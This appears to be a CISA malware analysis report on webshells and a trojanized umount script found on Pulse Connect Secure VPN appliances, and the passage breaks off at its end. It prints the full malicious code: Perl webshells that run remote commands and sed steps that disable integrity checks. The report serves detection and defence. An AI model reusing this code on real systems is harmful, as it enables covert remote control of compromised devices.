{
  "markdown": "\n\n\n\n\n\n\nNotification\n\nThis report is provided \"as is\" for informational purposes only. The Department of Homeland Security (DHS) does not provide any warranties of any kind regarding any information contained herein. The DHS does not endorse any commercial product or service referenced in this bulletin or otherwise.\nThis document is marked TLP:WHITE--Disclosure is not limited. Sources may use TLP:WHITE when information carries minimal or no foreseeable risk of misuse, in accordance with applicable rules and procedures for public release. Subject to standard copyright rules, TLP:WHITE information may be distributed without restriction. For more information on the Traffic Light Protocol (TLP), see http://www.cisa.gov/tlp.\n\nSummary\n\nDescription\nCISA received five files for analysis. Two files are Perl scripts that execute the attacker's commands stored in the environment variable; one file is a Perl library that provides functions to an installer; one file is a Perl script that creates a table and that table's first record; and one file is a shell script that manipulates the '/bin/umount' file and executes it. This analysis is derived from malicious files found on Pulse Connect Secure devices.\nFor a downloadable copy of indicators of compromise, see: MAR-10339606-1.v1.stix\nFiles (5)\n4ebb25ef9621c44cdb52630e44bcd1b5a848c0c56f01fa759863d50166bb0928 (umount)\n6959bbbe345b9699282b8a599b6a65e53731720905e2a40aaca16fa796ffe767 (DSUpgrade.pm)\nade49335dd276f96fe3ba89de5eb02ea380901b5ef60ff6311235b6318c57f66 (licenseserverproto.cgi)\ne3137135f4ad5ecdc7900a619d7f1b88ba252b963b38ae9a156299cc9bce92a1 (rdpreauth.cgi)\nea1574595f87171c26f483df77dec52b0c5c73dd37f4dd554944cd6a8b484d17 (licenseserverproto.cgi)\n\nFindings\n\nade49335dd276f96fe3ba89de5eb02ea380901b5ef60ff6311235b6318c57f66\nTags\nwebshell\nDetails\n\n\n\nName\nlicenseserverproto.cgi\n\n\nSize\n3386 bytes\n\n\nType\nPerl script text executable\n\n\nMD5\ned914f64e3dcc179b51d9a182eefc3cd\n\n\nSHA1\n51c6fb115683fd29cf905a9248c7ed57c0468cec\n\n\nSHA256\nade49335dd276f96fe3ba89de5eb02ea380901b5ef60ff6311235b6318c57f66\n\n\nSHA512\naf1e62a0bd37b639418e3f6c1d7186e3b2dfadb8e9ba8f19a6646d190757f331b43738adcd945c9d14a7c2215a6f8f68f9c6fe7ea4033c10bafc9b2d6f27c19e\n\n\nssdeep\n48:Ei3LYmeAJAZo6HMeQT808inRbxUQjQk0BeWo7BuswT4o7oo7vpBBBQWBZ7zSH72d:Ei7YkJAZnqpxUxHo0v/wO27YJ\n\n\nEntropy\n5.336890\n\n\n\nAntivirus\nNo matches found.\nYARA Rules\nNo matches found.\nssdeep Matches\nNo matches found.\nDescription\nThis is a Perl script that executes a HTTP GET command stored in the environment variables $ENV{'QUERY_STRING'}.\n\t\t\tIf the current webpage's parameter \"serverid\" matches, this script fetches the attacker's command from the environment variables $ENV{'QUERY_STRING'} and executes the HTTP GET command.\n\n\t\t\tThis Perl script also creates a table with two columns (msg_body, msg_length) and the first record for this table. The first record's msg_body is the standard input streams and msn_length is the standard input streams' length.\n\n\n6959bbbe345b9699282b8a599b6a65e53731720905e2a40aaca16fa796ffe767\nTags\nwebshell\nDetails\n\n\n\nName\nDSUpgrade.pm\n\n\nSize\n9791 bytes\n\n\nType\nPerl5 module source, ASCII text\n\n\nMD5\n4d5b410e1756072a701dfd3722951907\n\n\nSHA1\ncc68a9c5ff57129e8b897d228e54807841f8ff67\n\n\nSHA256\n6959bbbe345b9699282b8a599b6a65e53731720905e2a40aaca16fa796ffe767\n\n\nSHA512\n965b13b1a11c2b2472de1f491bb3fde1d96288fa204428b135281ae7928a5bafea5c244fdd1f47a96242861c94a4fa8d5f6664f543dec33cfc519faca044766d\n\n\nssdeep\n192:eIB1XcTfXss+nBqXb+TSWbgXCiwWjoBTWFI4MhiirXHLwQBNaBiF3Ar8yXpayUM6:eIB1X1phiJ/irZNaBiF3CjCswmPyVoM\n\n\nEntropy\n5.235000\n\n\n\nAntivirus\nNo matches found.\nYARA Rules\nNo matches found.\nssdeep Matches\nNo matches found.\nDescription\nThis file is a Pulse Secure Perl application that has been modified to add webshell script code into the content of the Pulse Secure Perl CGI script file \"/root/home/webserver/htdocs/dana-na/licenseserver/licenseserverproto.cgi.\"\n\n\t\t\tThe script contains the following patched in commented out code:\n\n\t\t\t\u2014Begin Patched In Commented CGI Code\u2014\n\t\t\t###scriptstart\n\t\t\t#/bin/mount -o remount,rw /dev/root /\n\t\t\t#/bin/tar -xzf $innerarchive ./root/home/webserver/htdocs/dana-na/licenseserver/licenseserverproto.cgi\n\t\t\t#/bin/tar -xzf $innerarchive ./root/home/perl/DSUpgrade.pm\n\t\t\t#/bin/sed -i '/\\#\\#start_total/,/\\#\\#end_total/w 7CxA1p' outer-do-install\n\t\t\t#/bin/sed -i '/DSINSTALL_CLEAN/r 7CxA1p' ./root/home/perl/DSUpgrade.pm\n\t\t\t#/bin/sed -i '/\\#\\#cgistart1/,/\\#\\#cgiend1/w GqTv3w' outer-do-install\n\t\t\t#/bin/sed -i '/\\#\\#cgistart2/,/\\#\\#cgiend2/w Vi6d8h4' outer-do-install\n\t\t\t#/bin/sed -i '/^use DSUtilTable/r GqTv3w' ./root/home/webserver/htdocs/dana-na/licenseserver/licenseserverproto.cgi\n\t\t\t#/bin/sed -i '/^sub main/r Vi6d8h4' ./root/home/webserver/htdocs/dana-na/licenseserver/licenseserverproto.cgi\n\t\t\t#/bin/sed -i '/\\#\\#cgistart1/,/\\#\\#cgiend1/s/#//' ./root/home/webserver/htdocs/dana-na/licenseserver/licenseserverproto.cgi\n\t\t\t#/bin/sed -i '/\\#\\#cgistart2/,/\\#\\#cgiend2/s/#//' ./root/home/webserver/htdocs/dana-na/licenseserver/licenseserverproto.cgi\n\t\t\t#/bin/sed -i '/\\#\\#perlstart/,/\\#\\#perlend/s/#//' ./root/home/perl/DSUpgrade.pm\n\t\t\t#/bin/sed -i '/\\#\\#scriptstart/,/\\#\\#scriptend/s/^/#/' ./root/home/perl/DSUpgrade.pm\n\t\t\t#/usr/bin/gzip -d $innerarchive\n\t\t\t#/bin/tar -f /tmp/inside-package.tar -u ./root/home/webserver/htdocs/dana-na/licenseserver/licenseserverproto.cgi\n\t\t\t#/bin/tar -f /tmp/inside-package.tar -u ./root/home/perl/DSUpgrade.pm\n\t\t\t#/bin/rm -f 7CxA1p\n\t\t\t#/bin/rm -f GqTv3w\n\t\t\t#/bin/rm -f Vi6d8h4\n\t\t\t#/bin/rm -fr root\n\t\t\t#/usr/bin/gzip -c /tmp/inside-package.tar > $innerarchive\n\t\t\t###scriptend\n\n\t\t\t###cgistart1\n\t\t\t#use lib ($ENV{'DSINSTALL'} =~ /(\\S*)/)[0] . \"/perl/lib\";\n\t\t\t#use lib ($ENV{'DSINSTALL'} =~ /(\\S*)/)[0] . \"/perl/lib/MIME/Base64\";\n\t\t\t#use Crypt::RC4;\n\t\t\t#use MIME::Base64 ();\n\t\t\t#\n\t\t\t#sub parse_parameters ($) {\n\t\t\t# my %ret;\n\t\t\t#\n\t\t\t# my $input = shift;\n\t\t\t#\n\t\t\t# foreach my $pair (split('&', $input)) {\n\t\t\t# \u00a0\u00a0\u00a0my ($var, $value) = split('=', $pair, 2);\n\t\t\t# \u00a0\u00a0\u00a0\n\t\t\t# \u00a0\u00a0\u00a0if($var) {\n\t\t\t# \u00a0\u00a0\u00a0 $value =~ s/\\+/ /g ;\n\t\t\t# \u00a0\u00a0\u00a0 $value =~ s/%(..)/pack('c',hex($1))/eg;\n\t\t\t#\n\t\t\t# \u00a0\u00a0\u00a0 $ret{$var} = $value;\n\t\t\t# \u00a0\u00a0\u00a0}\n\t\t\t# }\n\t\t\t#\n\t\t\t# return %ret;\n\t\t\t#}\n\t\t\t###cgiend1\n\n\t\t\t###cgistart2\n\t\t\t# \u00a0\u00a0\u00a0my $enckey='1234567';\n\t\t\t# \u00a0\u00a0\u00a0my $data='1234567812345678';\n\t\t\t# \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0my $cipher = RC4($enckey, $data); \u00a0\u00a0\u00a0\n\t\t\t# \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0my $encode = MIME::Base64::encode($cipher);\n\t\t\t# \u00a0\u00a0\u00a0my $psalLaunch = CGI::param(\"serverid\");\n\t\t\t# \u00a0\u00a0\u00a0if ($psalLaunch =~ /csJ1TA45JzB0WJrjA5X8dpVbXcrDMVfa/)\n\t\t\t# \u00a0\u00a0\u00a0{\n\t\t\t# \u00a0\u00a0\u00a0my ($cmd, %FORM);\n\t\t\t#\n\t\t\t# \u00a0\u00a0\u00a0$|=1;\n\t\t\t#\n\t\t\t# \u00a0\u00a0\u00a0print \"Content-Type: text/html\\r\\n\";\n\t\t\t# \u00a0\u00a0\u00a0print \"\\r\\n\";\n\t\t\t# \u00a0\u00a0\u00a0%FORM = parse_parameters($ENV{'QUERY_STRING'});\n\t\t\t#\n\t\t\t# \u00a0\u00a0\u00a0if(defined $FORM{'cmd'}) {\n\t\t\t# \u00a0\u00a0\u00a0 $cmd = $FORM{'cmd'};\n\t\t\t# \u00a0\u00a0\u00a0}\n\t\t\t#\n\t\t\t#print '<HTML>\n\t\t\t#<body>\n\t\t\t#<form action=\"\" method=\"GET\">\n\t\t\t#<input type=\"text\" name=\"cmd\" size=45 value=\"' . $cmd . '\">\n\t\t\t#<input type=\"text\" name=\"serverid\" size=45 value=\"csJ1TA45JzB0WJrjA5X8dpVbXcrDMVfa\">\n\t\t\t#<input type=\"submit\" value=\"Run\">\n\t\t\t#</form>\n\t\t\t#<pre>';\n\t\t\t#\n\t\t\t#if(defined $FORM{'cmd'}) {\n\t\t\t# print \"Results of '$cmd' execution:\\n\\n\";\n\t\t\t# print \"-\"x80;\n\t\t\t# print \"\\n\";\n\t\t\t#\n\t\t\t# print $encode;\n\t\t\t# system $cmd;\n\t\t\t# print \"-\"x80;\n\t\t\t# print \"\\n\";\n\t\t\t#}\n\t\t\t# print \"</pre>\";\n\t\t\t# exit(0);\n\t\t\t# \u00a0\u00a0\u00a0}\n\t\t\t###cgiend2\n\n\t\t\t##end_total\n\t\t\t--End Patched In Commented CGI Code--\n\n\t\t\tThe Pulse Secure Perl script also contains the following suspicious live / uncommented code. This code is designed to modify several Pulse Secure system files using the SED command as well as attempt to install code from within an archive named new-pack.tgz expected to be currently stored on the target system.\n\n\t\t\t--Begin Patched In Commented Code--\n\t\t\tsub installPackage {\n\t\t\tmy ($clean, $console, $html) = @_;\n\n\t\t\t$ENV{\"DSINSTALL_CLEAN\"} = $clean;\n\n\t\t\t##start_total\n\t\t\t##perlstart\n\t\t\tsystem(\"/bin/mount -o remount,rw /dev/root /\");\n\t\t\tsystem(\"/bin/tar -xzf /tmp/new-pack.tgz ./installer/outer-do-install\");\n\t\t\tmy $statushh = $? % 255;\n\t\t\tif( $statushh != 0 )\n\t\t\t{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0system(\"/bin/tar -xzf /tmp/new-pack.tgz ./root/home/webserver/htdocs/dana-na/licenseserver/licenseserverproto.cgi\");\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0system(\"/bin/tar -xzf /tmp/new-pack.tgz ./root/home/perl/DSUpgrade.pm\"); \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0system(\"/bin/sed -i '/\\#\\#start_total/,/\\#\\#end_total/w K872Bu' /home/perl/DSUpgrade.pm\");\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0system(\"/bin/sed -i '/DSINSTALL_CLEAN/r K872Bu' ./root/home/perl/DSUpgrade.pm\");\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0system(\"/bin/sed -i '/\\#\\#cgistart1/,/\\#\\#cgiend1/w Mj1Za' /home/perl/DSUpgrade.pm\");\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0system(\"/bin/sed -i '/\\#\\#cgistart2/,/\\#\\#cgiend2/w 1uMfVB' /home/perl/DSUpgrade.pm\");\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0system(\"/bin/sed -i '/^use DSUtilTable/r Mj1Za' ./root/home/webserver/htdocs/dana-na/licenseserver/licenseserverproto.cgi\");\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0system(\"/bin/sed -i '/^sub main/r 1uMfVB' ./root/home/webserver/htdocs/dana-na/licenseserver/licenseserverproto.cgi\");\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0system(\"/bin/sed -i '/\\#\\#cgistart1/,/\\#\\#cgiend1/s/#//' ./root/home/webserver/htdocs/dana-na/licenseserver/licenseserverproto.cgi\");\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0system(\"/bin/sed -i '/\\#\\#cgistart2/,/\\#\\#cgiend2/s/#//' ./root/home/webserver/htdocs/dana-na/licenseserver/licenseserverproto.cgi\");\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0system(\"/usr/bin/gzip -d /tmp/new-pack.tgz\");\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0system(\"/bin/tar -f /tmp/new-pack.tar -u ./root/home/webserver/htdocs/dana-na/licenseserver/licenseserverproto.cgi\");\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0system(\"/bin/tar -f /tmp/new-pack.tar -u ./root/home/perl/DSUpgrade.pm\");\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0system(\"/bin/rm -f K872Bu\");\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0system(\"/bin/rm -f Mj1Za\");\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0system(\"/bin/rm -f 1uMfVB\"); \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0system(\"/bin/rm -fr root\");\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0system(\"rm -f /tmp/new-pack.tgz\");\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0system(\"/usr/bin/gzip -c /tmp/new-pack.tar > /tmp/new-pack.tgz\"); \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t}\n\t\t\telse{\n\t\t\tsystem(\"/bin/sed -i '/\\#\\#start_total/,/\\#\\#end_total/w Nc3Gy.pm' /home/perl/DSUpgrade.pm\");\n\t\t\tsystem(\"/bin/sed -i '/packdecrypt/r Nc3Gy.pm' ./installer/outer-do-install\");\n\t\t\tsystem(\"/bin/sed -i '/\\#\\#perlstart/,/\\#\\#perlend/s/^/#/' ./installer/outer-do-install\");\n\t\t\tsystem(\"/bin/sed -i '/\\#\\#scriptstart/,/\\#\\#scriptend/s/#//' ./installer/outer-do-install\");\n\t\t\tsystem(\"/usr/bin/gzip -d /tmp/new-pack.tgz\");\n\t\t\tsystem(\"/bin/tar -f /tmp/new-pack.tar -u ./installer/outer-do-install\");\n\t\t\tsystem(\"rm -f Nc3Gy.pm\");\n\t\t\tsystem(\"rm -f /tmp/new-pack.tgz\");\n\t\t\tsystem(\"/usr/bin/gzip -c /tmp/new-pack.tar > /tmp/new-pack.tgz\");\n\t\t\tsystem(\"rm -fr installer\");\n\t\t\t}\n\t\t\t--End Patched In Commented Code--\n\n\t\t\tAnalysis indicates this commented code is designed to present a web form to a remote operator, wherein the remote operator can enter commands that will be run locally on the target system. The commented code also has the capability to modify several Pulse Secure system files utilizing the SED command.\n\n\ne3137135f4ad5ecdc7900a619d7f1b88ba252b963b38ae9a156299cc9bce92a1\nTags\nwebshell\nDetails\n\n\n\nName\nrdpreauth.cgi\n\n\nSize\n1894 bytes\n\n\nType\nPerl script text executable\n\n\nMD5\ne7e2f79ade6f198c5d9707b6f94a9a41\n\n\nSHA1\n0a4a5be7704fa9f1a8c826888060831051767b52\n\n\nSHA256\ne3137135f4ad5ecdc7900a619d7f1b88ba252b963b38ae9a156299cc9bce92a1\n\n\nSHA512\naf5ba0cd5dcc6f2761bce3950c8aa918df9611796da53657790d34d8ea014d6ece27a8fa302ebed9fd235dff2b3ce864ff0c462c3fa0997b65b666107eb3c204\n\n\nssdeep\n48:E8LYaef1MCZDh7YQkg/3YElOI1P9Y611Zze4+kBkqFogb4mX/yZTOj:EaYH5Z17Yc/3Y6z/3e2CqFHbXvv\n\n\nEntropy\n5.032639\n\n\n\nAntivirus\nNo matches found.\nYARA Rules\nNo matches found.\nssdeep Matches\nNo matches found.\nDescription\nThis file is a Pulse Secure system application that has been modified to allow an operator to remotely execute commands on a compromised Pulse Secure device. Its main() function (See Figure) has been hooked with the webshell illustrated below. This webshell is similar in design and functionality to the webshell described in the file sdp_mobile_login.cgi. A primary difference in this webshell is that the static value BM6OAa1XCpH4x4ISEnJYZXmyHhJG8JxC must be passed in with the HTTP_X_KEY parameter for the webshell to process and execute a provided command.\nScreenshots\n \n\nScreen_Shot_2021-07-30_at_10.54.42.png - \n\n\n\n4ebb25ef9621c44cdb52630e44bcd1b5a848c0c56f01fa759863d50166bb0928\nDetails\n\n\n\nName\numount\n\n\nSize\n53836 bytes\n\n\nType\ndata\n\n\nMD5\n53a3bce53a360a8614337ac52672cd20\n\n\nSHA1\n4991f7ffbb16128fafc1c6d476a5793f4dc2554a\n\n\nSHA256\n4ebb25ef9621c44cdb52630e44bcd1b5a848c0c56f01fa759863d50166bb0928\n\n\nSHA512\n6ed95c5d452ee26bcc8b945aafb17807d1db2d6b3b46958435a02619c6cddf1b5a017a36d4e022c6e9ae57d588d29f1eac95c25496834cab86564c1f288491fe\n\n\nssdeep\n768:EAkWEZfTRlHCc6DZ7z1K1q0C+i6d81CEdObeDE+sJeRbtkzuBe5Ri3XJCEJ:QWQtXkZ9K00C+iQVeQeRxOAkEJ\n\n\nEntropy\n6.131720\n\n\n\nAntivirus\nNo matches found.\nYARA Rules\nNo matches found.\nssdeep Matches\nNo matches found.\nDescription\nThis file is a malicious replacement for the Unix umount binary. The modified umount application contains a bash script with an appended ELF binary. When the system attempts to perform an unmount, the \"main\" portion of this script will perform several system modifications to the Pulse Secure device before extracting the appended ELF binary, writing it to disk, marking it executable, and using it to actually perform the umount task. This application acts as a \"hook\" to the compromised device's unmount task. The system modifications performed during this \"hook\" are ultimately designed to provide a hacker remote command and control capabilities over a compromised Pulse Secure device.\n\n\t\t\tThe full malicious script contained within this application is illustrated below. After this full illustration is a summary explanation of the primary pieces of this full malicious script.\n\n\t\t\t--Begin Full Malicious Script--\n\n\t\t\t##sstart\n\t\t\t#!/bin/bash\n\t\t\tnormal_um()\n\t\t\t{\n\t\t\t\u00a0\u00a0\u00a0/bin/cp /bin/umount /bin/umount_re\n\t\t\t\u00a0\u00a0\u00a0/bin/sed -i '/\\#\\#sstart/,/\\#\\#eend/d' /bin/umount_re\n\t\t\t\u00a0\u00a0\u00a0/bin/sed -i '1d' /bin/umount_re\n\t\t\t\u00a0\u00a0\u00a0/bin/sed -i 's/^#//' /bin/umount_re\n\t\t\t\u00a0\u00a0\u00a0/bin/chmod u+x /bin/umount_re\n\t\t\t\u00a0\u00a0\u00a0/bin/umount_re $*\n\t\t\t\u00a0\u00a0\u00a0/bin/rm -f /bin/umount_re\n\t\t\t\u00a0\u00a0\u00a0/bin/mount -o remount,ro /dev/root / >/dev/null 2>&1\n\t\t\t}\n\n\t\t\tpatch_manifest()\n\t\t\t{\n\t\t\t\u00a0\u00a0\u00a0file=\"/tmp/data/root/home/webserver/htdocs/dana-na/auth/sdp_mobile_login.cgi\"\n\t\t\t\u00a0\u00a0\u00a0OPENSSL=\"/tmp/data/root/home/bin/openssl\"\n\t\t\t\u00a0\u00a0\u00a0h=`$OPENSSL dgst -sha256 $file 2>/dev/null | sed -e 's/^[^ ]*= //'`\n\t\t\t\u00a0\u00a0\u00a0bkh=\"/home/webserver/htdocs/dana-na/auth/sdp_mobile_login.cgi \"$h\" b\"\n\t\t\t\u00a0\u00a0\u00a0ori=`sed -n \"/sdp_mobile_login.cgi/=\" /tmp/data/root/home/etc/manifest/manifest`\n\t\t\t\u00a0\u00a0\u00a0if [ -n \"$ori\" ]; then\n\t\t\t\u00a0\u00a0\u00a0 /bin/sed -i \"$ori\"a\\\\\"$bkh\" /tmp/data/root/home/etc/manifest/manifest\n\t\t\t\u00a0\u00a0\u00a0 /bin/sed -i \"$ori\"d /tmp/data/root/home/etc/manifest/manifest\n\t\t\t\u00a0\u00a0\u00a0fi\n\n\t\t\t\u00a0\u00a0\u00a0sed -i '/verify 1/d' /tmp/data/root/home/bin/check_integrity.sh\n\t\t\t\u00a0\u00a0\u00a0sed -i '/err Signature/d' /tmp/data/root/home/bin/check_integrity.sh\n\t\t\t}\n\n\n\t\t\tpatch_cgi()\n\t\t\t{\n\t\t\t\u00a0\u00a0\u00a0/bin/sed -i '/\\#\\#cgistart1/,/\\#\\#cgiend1/w tmp1' /bin/umount\n\t\t\t\u00a0\u00a0\u00a0/bin/sed -i '/\\#\\#cgistart2/,/\\#\\#cgiend2/w tmp2' /bin/umount\n\t\t\t\u00a0\u00a0\u00a0/bin/sed -i '/^use DSSessionParams/r tmp1' /tmp/data/root/home/webserver/htdocs/dana-na/auth/sdp_mobile_login.cgi\n\t\t\t\u00a0\u00a0\u00a0/bin/sed -i '/^sub main/r tmp2' /tmp/data/root/home/webserver/htdocs/dana-na/auth/sdp_mobile_login.cgi\n\t\t\t\u00a0\u00a0\u00a0/bin/sed -i '/\\#\\#cgistart1/,/\\#\\#cgiend1/s/#//' /tmp/data/root/home/webserver/htdocs/dana-na/auth/sdp_mobile_login.cgi\n\t\t\t\u00a0\u00a0\u00a0/bin/sed -i '/\\#\\#cgistart2/,/\\#\\#cgiend2/s/#//' /tmp/data/root/home/webserver/htdocs/dana-na/auth/sdp_mobile_login.cgi\n\t\t\t\u00a0\u00a0\u00a0/bin/sed -i '/\\#\\#cgi/d' /tmp/data/root/home/webserver/htdocs/dana-na/auth/sdp_mobile_login.cgi\n\t\t\t\u00a0\u00a0\u00a0/bin/rm -f tmp1\n\t\t\t\u00a0\u00a0\u00a0/bin/rm -f tmp2\n\t\t\t}\n\n\t\t\tpatch_libdsp()\n\t\t\t{\n\t\t\t\u00a0\u00a0\u00a0/bin/sed -i 's/ForceCommand/#orceCommand/g' /tmp/data/root/home/lib/libdsplibs.so\n\t\t\t\u00a0\u00a0\u00a0/bin/sed -i '/local line c file sha m/,/exit 1/s/verifyFiles//g' /tmp/data/root/home/bin/check_integrity.sh\n\t\t\t}\n\n\t\t\tpatch_umount()\n\t\t\t{\n\t\t\t\u00a0\u00a0\u00a0/bin/sed -i '/\\#\\#sstart/,/\\#\\#eend/w /tmp/data/root/bin/xx' /bin/umount\n\t\t\t\u00a0\u00a0\u00a0/bin/sed -i 's/^/#/' /tmp/data/root/bin/umount\n\t\t\t\u00a0\u00a0\u00a0/bin/sed -i '1i \\ ' /tmp/data/root/bin/umount\n\t\t\t\u00a0\u00a0\u00a0/bin/sed -i '1r /tmp/data/root/bin/xx' /tmp/data/root/bin/umount\n\t\t\t\u00a0\u00a0\u00a0/bin/touch /tmp/data/root/bin/umount -r /tmp/data/root/bin/cp\n\t\t\t\u00a0\u00a0\u00a0/bin/rm -f /tmp/data/root/bin/xx\n\t\t\t}\n\n\n\n\n\t\t\twaitweb()\n\t\t\t{\n\t\t\t\u00a0\u00a0\u00a0trap '' HUP >/dev/null 2>&1\n\t\t\t\u00a0\u00a0\u00a0st=1\n\t\t\t\u00a0\u00a0\u00a0while [ $st -lt 2 ] ; do\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0ps -fA|grep /home/bin/web |grep -v grep > /dev/null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if [ $? -eq 0 ]; then\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0sleep 3\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0/bin/mount -o remount,rw /dev/root / >/dev/null 2>&1\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0st=2\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0/bin/mount -o remount,ro /dev/root / > /dev/null 2>&1\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0else\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0sleep 2\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0fi\n\t\t\t\u00a0\u00a0\u00a0done\n\t\t\t}\n\n\t\t\t/bin/mount -o remount,rw /dev/root / >/dev/null 2>&1\n\t\t\tif [ $# == 2 ] && [ $1 == \"-r\" ] && [ $2 == \"/tmp/data/root\" ] ; then\n\t\t\t\u00a0\u00a0\u00a0patch_cgi\n\t\t\t\u00a0\u00a0\u00a0patch_manifest\n\t\t\t\u00a0\u00a0\u00a0patch_umount\n\t\t\t\u00a0\u00a0\u00a0patch_libdsp\n\t\t\t\u00a0\u00a0\u00a0normal_um $*\n\t\t\telse\n\t\t\t\u00a0\u00a0\u00a0normal_um $*\n\t\t\tfi\n\n\t\t\t###cgistart1\n\t\t\t#use Crypt::RC4;\n\t\t\t#use MIME::Base64 ();\n\t\t\t###cgiend1\n\n\t\t\t###cgistart2\n\t\t\t#my $request_method=$ENV{'REQUEST_METHOD'};\n\t\t\t#if ($request_method eq \"POST\") {\n\t\t\t# \u00a0\u00a0\u00a0my $x_key = $ENV{'HTTP_X_KEY'};\n\t\t\t# \u00a0\u00a0\u00a0if ($x_key eq \"zzdibweoQxffnDEi2UKacJlEekplJ7uwrt\") {\n\t\t\t# \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0my $x_cmd = $ENV{'HTTP_X_CMD'};\n\t\t\t# \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0my $x_cnt = $ENV{'HTTP_X_CNT'};\n\t\t\t# \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$x_cmd = MIME::Base64::decode($x_cmd);\n\t\t\t# \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$x_cmd = RC4($x_cnt, $x_cmd);\n\t\t\t# \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0my $res;\n\t\t\t# \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0my $re=popen(*DUMP, $x_cmd, \"r\");\n\t\t\t# \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0while(<DUMP>){\n\t\t\t# \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$res .= $_;\n\t\t\t# \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t# \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0close(*DUMP);\n\t\t\t# \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0print \"Content-type:text/html\\n\\n\";\n\t\t\t# \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0print MIME::Base64::encode(RC4($x_cnt, $res));\n\t\t\t# \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0exit(0);\n\t\t\t# \u00a0\u00a0\u00a0}\n\t\t\t# \u00a0\u00a0\u00a0else {\n\t\t\t# \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0exit(0);\n\t\t\t# \u00a0\u00a0\u00a0}\n\t\t\t#}\n\t\t\t###cgiend2\n\n\t\t\t##eend\n\n\t\t\t--End Full Malicious Script--\n\n\t\t\tThe function illustrated below is designed to make a small modification to the Pulse Secure system file named libdsplibs.so. This function will change all occurrences of the string \"ForceCommand\" in the libdsplibs.so binary to the string \"#orceCommand\". The function below will also remove the string \"verifyFiles\" from the Pulse Secure system file named check_integrity.sh.\n\n\t\t\t--Begin libdsplibs.so Modification Function--\n\n\t\t\tpatch_libdsp()\n\t\t\t{\n\t\t\t\u00a0\u00a0\u00a0/bin/sed -i 's/ForceCommand/#orceCommand/g' /tmp/data/root/home/lib/libdsplibs.so\n\t\t\t\u00a0\u00a0\u00a0/bin/sed -i '/local line c file sha m/,/exit 1/s/verifyFiles//g' /tmp/data/root/home/bin/check_integrity.sh\n\t\t\t}\n\n\t\t\t--End libdsplibs.so Modification Function--\n\n\t\t\tThe function illustrated below is designed to modify the Pulse Secure system files named manifest and check_integrity.sh. As illustrated, this function hashes the new version of the script named sdp_mobile_login.cgi, which now contains a patched in webshell. The function then counts the number of times the string \"sdp_mobile_login.cgi\" is found in the Pulse Secure manifest file. The malware then replaces this \"sdp_mobile_login.cgi\" string with the full path of the patched version, and its corresponding SHA256 value within the manifest file. The replacement string for the current \"sdp_mobile_login.cgi\" strings will appear similar to the following: \"/home/webserver/htdocs/dana-na/auth/sdp_mobile_login.cgi 6092a24ca3853fb351989ee1aa2eca604fc438afc1e64df3ede10ffda577d475 b\".\n\n\t\t\tThe function then removes the strings \"verify 1\" and \"err Signature\" from the Pulse Secure system file check_integrity.sh. The purpose of these modifications are not conclusively known, however it appears the modifications may be required for the Pulse Secure system to allow the execution of the hacker modified version of sdp_mobile_login.cgi.\n\n\t\t\tNote: The comments in the code below were added by CISA to clarify the functionality of different parts of the malicious code.\n\n\t\t\t--Begin manifest and check_integrity.sh Modification 